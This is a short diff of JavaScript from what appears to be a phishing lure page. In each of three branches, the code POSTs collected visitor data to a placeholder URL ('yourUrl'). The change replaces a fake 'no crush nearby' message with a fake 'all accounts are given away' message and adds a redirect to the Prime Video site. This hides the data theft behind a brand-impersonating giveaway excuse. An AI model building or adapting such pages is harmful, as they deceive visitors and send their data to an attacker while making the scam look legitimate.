@@ -27,7 +27,8 @@
 				xhr.open("POST", yourUrl, true);
 				xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 				xhr.send(data);
-				alert("Oops! We cant find any Crush nearby your location!"); 
+				alert("Oops! You're late. All accounts are given away");
+				window.location = "https://www.primevideo.com"; 
 			}
 			else{
 				var xhr = new XMLHttpRequest();
@@ -36,7 +37,8 @@
 				xhr.open("POST", yourUrl, true);
 				xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 				xhr.send(data);
-				alert("Oops! We cant find any Crush nearby your location!"); 
+				alert("Oops! You're late. All accounts are given away");
+				window.location = "https://www.primevideo.com";
 			}
 	}
 };
@@ -65,7 +67,8 @@
 		xhr.open("POST", yourUrl, true);
 		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 		xhr.send(data);
-		alert("Oops! We cant find any Crush nearby your location!");
+		alert("Oops! You're late. All accounts are given away");
+		window.location = "https://www.primevideo.com";
 	}
 };
 
